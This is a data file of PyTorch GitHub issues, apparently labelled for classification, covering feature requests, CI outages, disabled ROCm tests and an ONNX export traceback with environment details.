Feature Request: Add Deterministic Support for  `upsample_bilinear2d_backward_out_cuda` feature module: nn triaged module: determinism,"### üöÄ The feature, motivation and pitch

Please add the deterministic support for this operation in pytorch: `upsample_bilinear2d_backward_out_cuda`.  
Below is the error message I am getting when I use `torch.use_deterministic_algorithms(True)` in my code. 
``` 
RuntimeError: upsample_bilinear2d_backward_out_cuda does not have a deterministic implementation, but you set 
'torch.use_deterministic_algorithms(True)'. You can turn off determinism just for this operation, or you can use the 
'warn_only=True' option, if that's acceptable for your application. You can also file an issue at 
https://github.com/pytorch/pytorch/issues to help us prioritize adding deterministic support for this operation. 
```


### Alternatives

_No response_

### Additional context

_No response_

cc @albanD @mruberry @jbschlosser @walterddr @mikaylagawarecki @kurtamohler",False
MacOS outage (2023-10-13) ci: sev ci: sev-infra.pet ci: sev-infra.os,"## Current Status
Ongoing

## Error looks like
All MacOS runners are gone.

## Incident timeline (all times pacific)
1700 PST

## User impact
No runner to run MacOS jobs

## Root cause
It's unclear. I ran https://github.com/fairinternal/pytorch-gha-infra/actions/runs/6513098460 earlier in the afternoon, so it could be the trigger.  But this looks like yet another runner update from GitHub.

## Mitigation
Move MacOS job to unstable

## Prevention/followups
TBD

cc @jeanschmidt @DanilBaibak 
",False
UNSTABLE pull / linux-docs / build-docs-python-false module: ci unstable,"Broken by https://github.com/pytorch/pytorch/pull/111108, cannot revert normally. Asking the author to forward fix.

cc @seemethere @malfet @pytorch/pytorch-dev-infra",False
Test factory functions with layout=torch.strided good first issue triaged module: testing,"### üöÄ The feature, motivation and pitch

It'd be nice to have an OpInfo-based test that tests this. See https://github.com/pytorch/pytorch/pull/111205 and the issue that the PR resolves.

### Alternatives

_No response_

### Additional context

_No response_",False
[dynamo] annotate configs with `@compile_ignored`  triaged module: dynamo,"### üöÄ The feature, motivation and pitch

Originated: https://github.com/pytorch/pytorch/pull/111074#discussion_r1358455363

Tracked: https://github.com/pytorch/pytorch/issues/111220

This annotation means that we will not recompile if these configs change

We will also store separate dicts instead of a single `_config`:
`_compile_config` and `_compile_ignored`.

We can thus more quickly read and hash this config.

---

Currently ignorable dynamo configs:
```python
dynamo_guarded_config_ignorelist = {
    ""log_file_name"",
    ""verbose"",
    ""verify_correctness"",  # will not affect model, will raise RuntimeError
    # (no silent change to compilation behaviour)
    ""cache_size_limit"",
    ""accumulated_cache_size_limit"",
    ""print_specializations"",
    ""replay_record_enabled"",
    ""cprofile"",  # only wraps _compile, not graph
    ""repro_after"",
    ""repro_level"",
    ""repro_forward_only"",
    ""repro_tolerance"",
    ""same_two_models_use_fp64"",
    ""error_on_recompile"",  # safe because: will throw error
    ""report_guard_failures"",
    ""report_all_guard_failures"",
    ""base_dir"",  # used for minifying / logging
    ""translation_validation"",
    ""translation_validation_timeout"",
    ""translation_validation_no_bisect"",
    ""DEBUG_DIR_VAR_NAME"",
    ""debug_dir_root"",
}
```


cc @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False
Can we use dtensor.local = local_tensor to ovveride dtensor ? oncall: distributed module: dtensor,"### üöÄ The feature, motivation and pitch

Hi,torch team
Distributed tensors can be used as distributed containers, e.g., define a **dtensor_stroe**, storing the values of **dtensor_a.local * dtensor_b.local()**  at different ranks
dtensor.local = local_tensor

### Alternatives

_No response_

### Additional context

_No response_

cc @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @osalpekar @jiayisuse @H-Huang @kwen2501 @awgu @penguinwu",False
"[AOTInductor] 14K models: expected inputs vector size to be 1, but got 3 triaged oncall: pt2","395 errors like: RuntimeError: expected inputs vector size to be 1, but got 3 (example ./generated/test_LoSealL_VideoSuperResolution.py:make_dense # pytest ./generated/test_LoSealL_VideoSuperResolution.py -k test_042)

Repro:
```
git clone https://github.com/jansel/pytorch-jit-paritybench.git
# set PYTHONPATH like the following example
export PYTHONPATH=/home/binbao/local/pytorch-jit-paritybench/paritybench:$PYTHONPATH
python main.py --compile_mode=aot_inductor -e ./generated/test_LoSealL_VideoSuperResolution.py
```

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305",False
"DISABLED test_max_autotune_cutlass_backend_regular_mm_dynamic_False_max_autotune_gemm_backends_ATen, Triton, CUTLASS (__main__.TestDoBench) module: rocm triaged skipped","Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
"DISABLED test_max_autotune_cutlass_backend_mm_bias_dynamic_False_max_autotune_gemm_backends_ATen, Triton, CUTLASS (__main__.TestDoBench) module: rocm triaged skipped","Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
"DISABLED test_max_autotune_cut_addmm_dynamic_False_max_autotune_gemm_backends_ATen, Triton, CUTLASS (__main__.TestDoBench) module: rocm triaged skipped","Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_unfuse_bias_addmm (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_uint4x2_mixed_mm_gating_works (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_uint4x2_mixed_mm_fail_to_match (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_uint4x2_mixed_mm_epi (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_uint4x2_mixed_mm (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_splitwithsizes_cat (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_mm_plus_mm (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_mixed_mm_gating (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_mixed_mm_epi_works (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_mixed_mm (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_multi_return_some_unused (__main__.TestSerialize) module: rocm triaged module: flaky-tests skipped module: dynamo,"Platforms: rocm

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/failure/test_multi_return_some_unused) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17591397405).

Over the past 72 hours, it has flakily failed in 6 workflow(s).

**Debugging instructions (after clicking on the recent samples link):**
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Grep for `test_multi_return_some_unused`


Test file path: `export/test_serialize.py`

cc @jeffdaily @sunway513 @jithunnair-amd @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @Xia-Weiwen @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False
[ONNX] Export of `torch.distributions.normal.Normal` fails in functionalization module: onnx triaged onnx-triaged module: dynamo,"```python
import torch

class Model(torch.nn.Module):
    def __init__(self):
        self.normal = torch.distributions.normal.Normal(0, 1)
        super().__init__()

    def forward(self, x):
        return self.normal.sample(x.shape)


model = Model()
x = torch.randn(2, 3)
print(model(x))
print(torch.onnx.dynamo_export(model, x).model_proto)
```

Fails with 

```
tensor([[-0.4411, -1.2260,  0.9509],
        [-1.6602,  2.4344,  2.1532]])
/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/exporter.py:130: UserWarning: torch.onnx.dynamo_export only implements opset version 18 for now. If you need to use a different opset version, please register them with register_custom_op.
  warnings.warn(
Traceback (most recent call last):
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/exporter.py"", line 1195, in dynamo_export
    ).export()
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/exporter.py"", line 950, in export
    graph_module = pre_export_passes(
  File ""<@beartype(torch.onnx._internal.exporter.pre_export_passes) at 0x7f9de3794f70>"", line 97, in pre_export_passes
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/exporter.py"", line 1235, in pre_export_passes
    module = passes.Functionalize(
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/diagnostics/infra/decorator.py"", line 151, in wrapper
    ctx.log_and_raise_if_error(diag)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/diagnostics/infra/context.py"", line 366, in log_and_raise_if_error
    raise diagnostic.source_exception
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/diagnostics/infra/decorator.py"", line 135, in wrapper
    return_values = fn(*args, **kwargs)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/_pass.py"", line 267, in run
    module = self._run(*args, **kwargs)
  File ""<@beartype(torch.onnx._internal.fx.passes.functionalization.Functionalize._run) at 0x7f9de37fcee0>"", line 11, in _run
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/passes/functionalization.py"", line 123, in _run
    graph_module = proxy_tensor.make_fx(
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/experimental/proxy_tensor.py"", line 841, in wrapped
    t = dispatch_trace(wrap_key(func, args, fx_tracer, pre_dispatch), tracer=fx_tracer, concrete_args=tuple(phs))
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_compile.py"", line 24, in inner
    return torch._dynamo.disable(fn, recursive)(*args, **kwargs)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/eval_frame.py"", line 406, in _fn
    return fn(*args, **kwargs)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/external_utils.py"", line 17, in inner
    return fn(*args, **kwargs)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/experimental/proxy_tensor.py"", line 461, in dispatch_trace
    graph = tracer.trace(root, concrete_args)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/eval_frame.py"", line 406, in _fn
    return fn(*args, **kwargs)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/external_utils.py"", line 17, in inner
    return fn(*args, **kwargs)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/_symbolic_trace.py"", line 817, in trace
    (self.create_arg(fn(*args)),),
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/experimental/proxy_tensor.py"", line 497, in wrapped
    out = f(*tensors)
  File ""<string>"", line 1, in <lambda>
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/passes/functionalization.py"", line 95, in wrapped
    pytree.tree_map(torch._sync, out)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/utils/_pytree.py"", line 291, in tree_map
    return tree_unflatten([fn(i) for i in flat_args], spec)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/utils/_pytree.py"", line 291, in <listcomp>
    return tree_unflatten([fn(i) for i in flat_args], spec)
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_utils.py"", line 881, in _functionalize_sync
    torch._functionalize_sync(t)
RuntimeError: at::functionalization::impl::isFunctionalTensor(self_) INTERNAL ASSERT FAILED at ""../torch/csrc/autograd/python_torch_functions_manual.cpp"":561, please report a bug to PyTorch. 

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File ""/home/justinchu/dev/onnx-script/onnxscript/export.py"", line 16, in <module>
    print(torch.onnx.dynamo_export(model, x).model_proto)
  File ""<@beartype(torch.onnx._internal.exporter.dynamo_export) at 0x7f9de3794e50>"", line 53, in dynamo_export
  File ""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/exporter.py"", line 1206, in dynamo_export
    raise OnnxExporterError(
torch.onnx.OnnxExporterError: Failed to export the model to ONNX. Generating SARIF report at 'report_dynamo_export.sarif'. SARIF is a standard format for the output of static analysis tools. SARIF logs can be loaded in VS Code SARIF viewer extension, or SARIF web viewer (https://microsoft.github.io/sarif-web-component/). Please report a bug on PyTorch Github: https://github.com/pytorch/pytorch/issues
```


### SARIF

```json
{
 ""runs"":[
  {
   ""tool"":{
    ""driver"":{
     ""name"":""torch.onnx.dynamo_export"",
     ""contents"":[
      ""localizedData"",
      ""nonLocalizedData""
     ],
     ""language"":""en-US"",
     ""rules"":[
      {
       ""id"":""FXE0010"",
       ""fullDescription"":{
        ""text"":""FX graph transformation during ONNX export before converting from FX IR to ONNX IR."",
        ""markdown"":""This diagnostic tracks the FX passes executed during the ONNX export process prior\nto converting from FX IR (Intermediate Representation) to ONNX IR.\n\nUnder the scope of ONNX export, an FX pass refers to a specific transformation applied to the FX GraphModule.\nThe primary aim of these passes is to streamline the graph into a format that aligns more with the ONNX IR.\nMoreover, these passes work to substitute unsupported FX IR features with those recognized and endorsed by\nONNX IR. Common transformations include, but aren't limited to, decomposition, functionalization and\ntype promotion.\n\nFor those who are interested in a comprehensive log detailing the modifications made during these passes,\nthere are a couple of options:\n\n- Set DiagnosticOptions.verbosity_level to logging.DEBUG.\n- Activate the environment variable TORCH_LOGS='onnx_diagnostics'.\n\nHowever, it's noteworthy that by default, such detailed logging is turned off. The primary reason being\nits considerable impact on performance.\n\nFor an in-depth understanding of each specific pass, please refer to the directory: torch/onnx/_internal/fx/passes.\n""
       },
       ""name"":""fx-pass"",
       ""shortDescription"":{
        ""text"":""FX graph transformation during ONNX export before converting from FX IR to ONNX IR.""
       }
      }
     ],
     ""version"":""2.2.0.dev20231011+cpu""
    }
   },
   ""language"":""en-US"",
   ""newlineSequences"":[
    ""\r\n"",
    ""\n""
   ],
   ""results"":[
    {
     ""message"":{
      ""markdown"":""Running Decompose pass. \n\n## Additional Message:\n\n## Function Signature\n### Function Signature Transform.run\n- self: <class 'torch.onnx._internal.fx.passes.decomp.Decompose'>\n- args: Tuple[length=1](\nTensor(f32[2, 3]),\n)\nFor detailed logging of graph modifications by this pass, either set `DiagnosticOptions.verbosity_level` to `logging.DEBUG` or use the environment variable `TORCH_LOGS='onnx_diagnostics'`.\n## Return values\ntorch.fx.GraphModule(<lambda>)"",
      ""text"":""Running Decompose pass. ""
     },
     ""codeFlows"":[
      {
       ""threadFlows"":[
        {
         ""locations"":[]
        }
       ]
      }
     ],
     ""graphs"":[],
     ""kind"":""informational"",
     ""level"":""none"",
     ""locations"":[
      {
       ""message"":{
        ""text"":""Transform.run""
       },
       ""physicalLocation"":{
        ""artifactLocation"":{
         ""uri"":""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/_pass.py""
        },
        ""region"":{
         ""snippet"":{
          ""text"":""@diagnostics.diagnose_call(""
         },
         ""startLine"":232
        }
       }
      }
     ],
     ""properties"":{
      ""tags"":[]
     },
     ""ruleId"":""FXE0010"",
     ""stacks"":[]
    },
    {
     ""message"":{
      ""markdown"":""Running Functionalize pass. \n\n## Additional Message:\n\n## Function Signature\n### Function Signature Transform.run\n- self: <class 'torch.onnx._internal.fx.passes.functionalization.Functionalize'>\n- args: Tuple[length=1](\nTensor(f32[2, 3]),\n)\nFor detailed logging of graph modifications by this pass, either set `DiagnosticOptions.verbosity_level` to `logging.DEBUG` or use the environment variable `TORCH_LOGS='onnx_diagnostics'`.\n## Exception log\n```\nTraceback (most recent call last):\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/diagnostics/infra/decorator.py\"", line 135, in wrapper\n    return_values = fn(*args, **kwargs)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/_pass.py\"", line 267, in run\n    module = self._run(*args, **kwargs)\n\n  File \""<@beartype(torch.onnx._internal.fx.passes.functionalization.Functionalize._run) at 0x7feb91391b40>\"", line 11, in _run\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/passes/functionalization.py\"", line 123, in _run\n    graph_module = proxy_tensor.make_fx(\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/experimental/proxy_tensor.py\"", line 858, in wrapped\n    t = dispatch_trace(wrap_key(func, args, fx_tracer, pre_dispatch), tracer=fx_tracer, concrete_args=tuple(phs))\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_compile.py\"", line 24, in inner\n    return torch._dynamo.disable(fn, recursive)(*args, **kwargs)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/eval_frame.py\"", line 401, in _fn\n    return fn(*args, **kwargs)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/external_utils.py\"", line 17, in inner\n    return fn(*args, **kwargs)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/experimental/proxy_tensor.py\"", line 478, in dispatch_trace\n    graph = tracer.trace(root, concrete_args)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/eval_frame.py\"", line 401, in _fn\n    return fn(*args, **kwargs)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_dynamo/external_utils.py\"", line 17, in inner\n    return fn(*args, **kwargs)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/_symbolic_trace.py\"", line 817, in trace\n    (self.create_arg(fn(*args)),),\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/fx/experimental/proxy_tensor.py\"", line 514, in wrapped\n    out = f(*tensors)\n\n  File \""<string>\"", line 1, in <lambda>\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/passes/functionalization.py\"", line 95, in wrapped\n    pytree.tree_map(torch._sync, out)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/utils/_pytree.py\"", line 314, in tree_map\n    return tree_unflatten([fn(i) for i in flat_args], spec)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/utils/_pytree.py\"", line 314, in <listcomp>\n    return tree_unflatten([fn(i) for i in flat_args], spec)\n\n  File \""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/_utils.py\"", line 881, in _functionalize_sync\n    torch._functionalize_sync(t)  # type: ignore[attr-defined]\n\nRuntimeError: at::functionalization::impl::isFunctionalTensor(self_) INTERNAL ASSERT FAILED at \""../torch/csrc/autograd/python_torch_functions_manual.cpp\"":598, please report a bug to PyTorch. \n\n```"",
      ""text"":""Running Functionalize pass. ""
     },
     ""codeFlows"":[
      {
       ""threadFlows"":[
        {
         ""locations"":[]
        }
       ]
      }
     ],
     ""graphs"":[],
     ""kind"":""fail"",
     ""level"":""error"",
     ""locations"":[
      {
       ""message"":{
        ""text"":""Transform.run""
       },
       ""physicalLocation"":{
        ""artifactLocation"":{
         ""uri"":""/home/justinchu/anaconda3/envs/onnx/lib/python3.10/site-packages/torch/onnx/_internal/fx/_pass.py""
        },
        ""region"":{
         ""snippet"":{
          ""text"":""@diagnostics.diagnose_call(""
         },
         ""startLine"":232
        }
       }
      }
     ],
     ""properties"":{
      ""tags"":[]
     },
     ""ruleId"":""FXE0010"",
     ""stacks"":[]
    }
   ]
  }
 ],
 ""version"":""2.1.0"",
 ""schemaUri"":""https://docs.oasis-open.org/sarif/sarif/v2.1.0/cs01/schemas/sarif-schema-2.1.0.json""
}
```

## Environments

```
Collecting environment information...
PyTorch version: 2.2.0.dev20231011+cpu
Is debug build: False
CUDA used to build PyTorch: None
ROCM used to build PyTorch: N/A

OS: Ubuntu 22.04.3 LTS (x86_64)
GCC version: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
Clang version: 14.0.0-1ubuntu1.1
CMake version: version 3.26.3
Libc version: glibc-2.35

Python version: 3.10.9 (main, Jan 11 2023, 15:21:40) [GCC 11.2.0] (64-bit runtime)
Python platform: Linux-6.2.0-1011-azure-x86_64-with-glibc2.35
Is CUDA available: False
CUDA runtime version: No CUDA
CUDA_MODULE_LOADING set to: N/A
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA
HIP runtime version: N/A
MIOpen runtime version: N/A
Is XNNPACK available: True

CPU:
Architecture:                       x86_64
CPU op-mode(s):                     32-bit, 64-bit
Address sizes:                      46 bits physical, 48 bits virtual
Byte Order:                         Little Endian
CPU(s):                             64
On-line CPU(s) list:                0-63
Vendor ID:                          GenuineIntel
Model name:                         Intel(R) Xeon(R) Platinum 8370C CPU @ 2.80GHz
CPU family:                         6
Model:                              106
Thread(s) per core:                 2
Core(s) per socket:                 32
Socket(s):                          1
Stepping:                           6
BogoMIPS:                           5586.87
Flags:                              fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc rep_good nopl xtopology cpuid pni pclmulqdq vmx ssse3 fma cx16 pcid sse4_1 sse4_2 movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch invpcid_single pti tpr_shadow vnmi ept vpid fsgsbase bmi1 hle avx2 smep bmi2 erms invpcid rtm avx512f avx512dq rdseed adx smap clflushopt avx512cd avx512bw avx512vl xsaveopt xsavec xsaves md_clear
Virtualization:                     VT-x
Hypervisor vendor:                  Microsoft
Virtualization type:                full
L1d cache:                          1.5 MiB (32 instances)
L1i cache:                          1 MiB (32 instances)
L2 cache:                           40 MiB (32 instances)
L3 cache:                           48 MiB (1 instance)
NUMA node(s):                       1
NUMA node0 CPU(s):                  0-63
Vulnerability Gather data sampling: Unknown: Dependent on hypervisor status
Vulnerability Itlb multihit:        KVM: Mitigation: VMX disabled
Vulnerability L1tf:                 Mitigation; PTE Inversion; VMX conditional cache flushes, SMT vulnerable
Vulnerability Mds:                  Mitigation; Clear CPU buffers; SMT Host state unknown
Vulnerability Meltdown:             Mitigation; PTI
Vulnerability Mmio stale data:      Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown
Vulnerability Retbleed:             Not affected
Vulnerability Spec store bypass:    Vulnerable
Vulnerability Spectre v1:           Mitigation; usercopy/swapgs barriers and __user pointer sanitization
Vulnerability Spectre v2:           Mitigation; Retpolines, STIBP disabled, RSB filling, PBRSB-eIBRS Not affected
Vulnerability Srbds:                Not affected
Vulnerability Tsx async abort:      Mitigation; Clear CPU buffers; SMT Host state unknown

Versions of relevant libraries:
[pip3] flake8==6.1.0
[pip3] mypy==1.5.1
[pip3] mypy-extensions==1.0.0
[pip3] numpy==1.25.1
[pip3] onnx-function-experiment==1.13.0.dev20230109
[pip3] onnx-script==0.1.0
[pip3] onnx-weekly==1.15.0.dev20231002
[pip3] onnxconverter-common==1.13.0
[pip3] onnxruntime==1.16.0
[pip3] onnxscript==0.1.0.dev20230913
[pip3] torch==2.2.0.dev20231011+cpu
[pip3] torchaudio==2.2.0.dev20231011+cpu
[pip3] torchvision==0.17.0.dev20231011+cpu
[pip3] triton==2.1.0
[conda] numpy                     1.25.1                   pypi_0    pypi
[conda] torch                     2.2.0.dev20231011+cpu          pypi_0    pypi
[conda] torchaudio                2.2.0.dev20231011+cpu          pypi_0    pypi
[conda] torchvision               0.17.0.dev20231011+cpu          pypi_0    pypi
[conda] triton                    2.1.0                    pypi_0    pypi
```

cc @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @Xia-Weiwen @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False
[Typo] about `scaled_dot_product_attention` doc oncall: transformer/mha,"https://pytorch.org/docs/stable/generated/torch.nn.functional.scaled_dot_product_attention.html

![image](https://github.com/pytorch/pytorch/assets/46072190/bd2f183b-4cb4-422e-9dd3-e18c981ca7bc)

There seems to be a typo here, it should be 'attn_bias.masked_fill_(attn_mask.logical_not(), float(""-inf""))' ?

cc @jbschlosser @bhosmer @cpuhrsch @erichan1 @drisspg @mikaylagawarecki",False
DISABLED test_modules_can_be_imported (__main__.TestPublicBindings) module: autograd triaged module: flaky-tests module: macos skipped,"Platforms: mac, macos

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/failure/test_modules_can_be_imported) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17582280667).

Over the past 72 hours, it has flakily failed in 6 workflow(s).

**Debugging instructions (after clicking on the recent samples link):**
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Grep for `test_modules_can_be_imported`


Test file path: `test_public_bindings.py`

cc @ezyang @albanD @zou3519 @gqchen @pearu @nikitaved @soulitzer @Lezcano @Varal7 @malfet",False
DISABLED test_cublas_baddbmm_large_input_1_10000_10000_10000_cuda_float16 (__main__.TestMatmulCudaCUDA) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_cublas_baddbmm_large_input_2_1000_1000_1000_cuda_float16 (__main__.TestMatmulCudaCUDA) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_cublas_baddbmm_large_input_2_100_100_100_cuda_float16 (__main__.TestMatmulCudaCUDA) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
